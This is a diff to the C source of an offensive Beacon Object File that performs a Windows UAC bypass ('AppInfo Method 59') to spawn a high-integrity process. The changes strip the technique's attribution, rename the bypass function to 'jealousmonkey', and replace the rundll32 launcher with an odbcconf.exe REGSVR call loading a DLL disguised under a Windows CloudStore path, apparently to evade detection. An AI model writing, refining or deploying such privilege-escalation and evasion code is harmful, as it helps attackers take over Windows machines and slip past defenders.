@@ -1,7 +1,3 @@
-/*
- * JealousMonkey — AppInfo Method 59 UAC bypass BOF
- * Port of STAGE2/method59.c (James Forshaw / UACME debug-object technique)
- */
 #include "bofdefs.h"
 #include "beacon.h"
 #include "appinfo64.h"
@@ -90,8 +86,8 @@ static BOOL build_default_payload(WCHAR *buf, DWORD cap) {
 
     if (MSVCRT$_snwprintf(
             buf, cap,
-            L"C:\\Windows\\System32\\rundll32.exe "
-            L"\"%s\\Microsoft\\Windows\\CloudStore\\Shell\\Windows.CloudStore.Schema.Shell.dll\",Start",
+            L"C:\\Windows\\System32\\odbcconf.exe /a {REGSVR "
+            L"%s\\Microsoft\\Windows\\CloudStore\\Shell\\Windows.CloudStore.Schema.Shell.dll}",
             localAppData) <= 0)
         return FALSE;
 
@@ -297,7 +293,7 @@ static NTSTATUS create_process_from_parent(HANDLE parentProcess, LPWSTR payload)
     return status;
 }
 
-static NTSTATUS uac_bypass_method59(LPWSTR payload) {
+static NTSTATUS jealousmonkey(LPWSTR payload) {
     BOOL debugObjectSet = FALSE;
     NTSTATUS status = STATUS_ACCESS_DENIED;
     HANDLE dbgHandle = NULL;
@@ -465,7 +461,7 @@ void go(char *args, unsigned long alen) {
     BeaconPrintf(CALLBACK_OUTPUT, "[*] MONKEY IS GETTING JEALOUS...\n");
 
     if (!is_user_admin()) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Local admin required (UAC-filtered token ok)\n");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Local admin required\n");
         return;
     }
 
@@ -484,7 +480,7 @@ void go(char *args, unsigned long alen) {
 
     BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Launching elevated child via AppInfo RPC...\n");
 
-    status = uac_bypass_method59(payload);
+    status = jealousmonkey(payload);
 
     if (NT_SUCCESS(status)) {
         BeaconPrintf(CALLBACK_OUTPUT, "\n[+] SUCCESS: high-integrity process spawned!\n");
